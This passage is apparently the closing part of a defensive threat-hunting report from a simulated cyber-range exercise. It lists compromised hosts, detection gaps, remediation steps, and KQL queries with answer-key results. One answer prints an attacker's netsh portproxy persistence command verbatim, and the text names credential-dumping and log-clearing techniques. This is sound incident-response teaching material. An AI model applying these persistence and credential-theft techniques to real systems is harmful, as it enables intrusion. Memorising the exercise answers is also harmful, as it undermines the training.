| m.richter | Credentials harvested from WS-ENG04 | Lateral movement to SRV-DC01 and SRV-FILES02 |

---

## 11. Affected Assets

| Machine | What it is | What happened to it |
|---------|-----------|-------------------|
| WS-ENG04 | Engineering workstation | Beachhead. Attacker had full interactive access for 2+ weeks. Used as pivot point. Portproxy persistence installed. |
| SRV-DC01 | Domain controller | ntds.dit extracted (all domain credentials compromised). Portproxy persistence installed. Security logs cleared. |
| SRV-FILES02 | File server | Classified A400M NavSys data stolen. Staging files created and cleaned up. Security logs cleared. |
| FortiGate VPN | Remote access gateway | Used as entry point with stolen credentials. No MFA. No geo-restriction. No lockout after failed login. |

---

## 12. Detection Gap Analysis

These are the things that should have caught this intrusion but did not.

| What failed | Why it matters | What to do about it |
|-------------|---------------|-------------------|
| No VPN anomaly detection | One account connected from 4 different IPs including known anonymisation infrastructure. Nobody noticed. | Set up alerts for accounts connecting from new IPs, especially ones on threat intelligence lists. |
| No MFA on VPN | The attacker only needed a username and password to get in. | Turn on MFA for all VPN connections. This alone would have prevented the entire intrusion. |
| Defender saw ntds.dit but did nothing | MsMpEng.exe scanned the file and took no action. The most sensitive file in Active Directory was extracted in plain sight. | Configure ASR (Attack Surface Reduction) rules to block ntdsutil IFM and comsvcs.dll abuse. |
| No monitoring for remote WMIC | The attacker remotely executed commands on two servers and nothing alerted. | Create detections for WMIC with /node: parameter, and for WmiPrvSE.exe spawning cmd.exe. |
| No detection for portproxy | Persistent network tunnels were created with no alert. | Monitor for netsh commands containing "portproxy" and registry changes to the PortProxy key. |
| Log clearing succeeded silently | Security logs were wiped on all three machines. | Forward logs to Sentinel in real time. Alert on Windows Event ID 1102 (audit log cleared). |
| Sysmon was the only thing that survived | If Sysmon had not been deployed, this intrusion would be completely invisible. | Make sure Sysmon is on every endpoint and server, forwarding to a central SIEM, and protected from tampering. |

---

## 13. Recommendations

### Do these now (24-48 hours)

1. Isolate WS-ENG04, SRV-DC01, and SRV-FILES02
2. Remove portproxy rules: run `netsh interface portproxy reset` on WS-ENG04 and SRV-DC01
3. Reset every password in the domain (ntds.dit was stolen, so every hash is compromised)
4. Reset the KRBTGT account password twice (to kill any Golden Tickets)
5. Block attacker IPs and the C2 domain at the firewall
6. Revoke and reissue all VPN credentials

### Do these soon (1-2 weeks)

7. Deploy MFA on all VPN connections
8. Rebuild WS-ENG04 from a clean image
9. Audit all machines for portproxy rules
10. Configure Defender ASR rules for credential dumping
11. Set up centralised log forwarding to Sentinel

### Do these over time (1-3 months)

12. Implement network segmentation between workstations and servers
13. Deploy a PAM solution for admin credentials
14. Add geo-restrictions to VPN
15. Start a regular threat hunting programme
16. Run a tabletop exercise based on this incident
17. Classify and audit all data on SRV-FILES02

---

## 14. Appendix - KQL Queries and Evidence

### Base Query (used in every query)

```kql
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
```

---

### Q02 - Origin of Failed Auth

```kql
HuntData
| where MdeTable == "FortiGateVPN"
| where AccountName == "s.brandt"
| where ActionType has "fail" or ActionType has "login"
| project EventTime, AccountName, RemoteIP, ActionType, TunnelIP, DestinationHost
| sort by EventTime asc
```

**Answer:** `185.220.101.34`


---

### Q06 - Initial Process

```kql
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName has "WS-ENG04"
| where AccountName == "s.brandt"
| project EventTime, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**Answer:** `systeminfo.exe/cmd.exe`


---

### Q08 - Network Reconnaissance

```kql
HuntData
| where isnotempty(DnsQueryString)
| where DeviceName has "WS-ENG04"
| project EventTime, DnsQueryString, DnsQueryResult, InitiatingProcessFileName
| sort by EventTime asc
```

**Answer:** `SRV-DC01, SRV-FILES02`

---

### Q24 - Matching Configuration on DC

```kql
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName has "SRV-DC01"
| where ProcessCommandLine has "netsh"
| project EventTime, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**Answer:** `netsh  interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=9999 connectaddress=10.1.36.210 connectport=8443 protocol=tcp`

---

### Q25 - Targeted Directory

```kql
HuntData
| where DeviceName has "SRV-FILES02"
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has_any ("zip", "compress", "archive", "cab", "makecab")
| project EventTime, AccountName, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**Answer:** `C:\Engineering\Avionics\A400M_NavSys`


---

### Other Useful Queries

**Profile all VPN accounts:**
```kql
HuntData
| where MdeTable == "FortiGateVPN"
| summarize 
    Sessions = count(),
    UniqueSourceIPs = dcount(RemoteIP),
    UniqueTunnelIPs = dcount(TunnelIP),
    SourceIPs = make_set(RemoteIP)
    by AccountName
| sort by Sessions desc
```

**All attacker commands on the beachhead (filtered):**
```kql
HuntData
| where MdeTable == "DeviceProcessEvents"
| where DeviceName has "WS-ENG04"
| where AccountName == "s.brandt"
| where FileName !in~ ("TSTheme.exe", "taskhostw.exe", "conhost.exe", 
    "AtBroker.exe", "cmd.exe", "rdpclip.exe", "smartscreen.exe", 
    "backgroundTaskHost.exe")
| project EventTime, FileName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

**File events on SRV-DC01 (ntds.dit staging):**
```kql
HuntData
| where MdeTable == "DeviceFileEvents"
| where DeviceName has "SRV-DC01"
| where FolderPath has "McAfee_Logs"
| project EventTime, FileName, FolderPath, ActionType, InitiatingProcessFileName
| sort by EventTime asc
```

**Which hosts did the attacker's tunnel IP reach:**
```kql
HuntData
| where MdeTable == "DeviceLogonEvents"
| where RemoteIP == "10.1.96.114"
| summarize count() by DeviceName
| sort by DeviceName asc
```

**All log-clearing commands across every host:**
```kql
HuntData
| where MdeTable == "DeviceProcessEvents"
| where ProcessCommandLine has "wevtutil" and ProcessCommandLine has "cl"
| project EventTime, DeviceName, AccountName, ProcessCommandLine, InitiatingProcessFileName
| sort by EventTime asc
```

---

**End of Report**

*This report was produced as part of the SancLogic CyberRange Hunt 04 engagement. All findings are based on telemetry from the Haldric Aerospace simulated environment.*
